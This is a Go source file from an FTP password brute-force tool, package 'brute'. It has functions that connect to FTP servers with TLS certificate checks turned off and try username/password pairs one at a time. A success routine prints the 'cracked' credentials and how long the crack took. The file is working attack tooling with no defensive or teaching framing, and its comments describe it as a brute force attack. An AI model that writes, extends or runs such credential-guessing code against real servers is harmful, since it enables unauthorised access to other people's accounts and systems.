package brute

import (
	"log"
	"sync/atomic"
	"time"
	"github.com/jlaffaye/ftp"
	"fmt"
	"crypto/tls"
)

const (
    Red    = "\033[31m"   // Color code for red
    Green  = "\033[32m"   // Color code for green
    Reset  = "\033[0m"    // Reset color code
)

type timerConfig struct {
	second string  // Time unit for seconds
	minute string  // Time unit for minutes
}

//FTP crack log
// This function is called when brute force attack is successful
func CrackDone(user string, passw string, crackSec float64) {
	// Define time units (seconds and minutes)
	timer_config := timerConfig{
		second: "seconds",
		minute: "minutes",
	}

	// Decide which time unit to use based on the crack time
	var time_unit string
	if crackSec > 60 {
		crackSec = crackSec/60
		time_unit = timer_config.minute
	} else {
		time_unit = timer_config.second
	}

	// Print the success message and details of the cracked FTP client
	fmt.Println("<=============================>")
	fmt.Println(Green+"Brute force done!"+Reset)
	fmt.Println("<=============================>")
	fmt.Println("User:", user)
	fmt.Println("Password:", passw)
	fmt.Println("<=============================>")
	// Print the time taken to crack the client
	fmt.Printf("%vFTP client cracked in %v%.2f%v %v%v\n",Green, Reset, crackSec, Green, time_unit,Reset)
	fmt.Println("<=============================>")
}

// Connect to an FTP server with or without TLS encryption
func ConnectFTP(hostname string, tlsFlag bool) (*ftp.ServerConn, error) {
	var client *ftp.ServerConn
	var err error

	// If TLS is enabled, establish a secure connection
	if tlsFlag {
		client, err = ftp.Dial(hostname, ftp.DialWithTLS(&tls.Config{
			InsecureSkipVerify: true, // ignore certificate validations
		}))
	} else {
		// Otherwise, use a standard connection
		client, err = ftp.Dial(hostname)
	}

	return client, err
}

// Function to try FTP login with provided user and password
func TryLogin(client *ftp.ServerConn, user, passw string, found *int32, start time.Time) {
	// Attempt to login
	err := client.Login(user, passw)
	if err != nil {
		// If login fails, log the attempt
		if atomic.LoadInt32(found) == 0 {
			log.Printf("%vFailed%v to login with user: %v and password: %v", Red, Reset, user, passw)
		}
	} else {
		// If login is successful, log the success and stop further attempts
		if atomic.CompareAndSwapInt32(found, 0, 1) {
			crackTime := time.Since(start)
			crackSec := crackTime.Seconds()
			CrackDone(user, passw, crackSec)
		}
	}
}
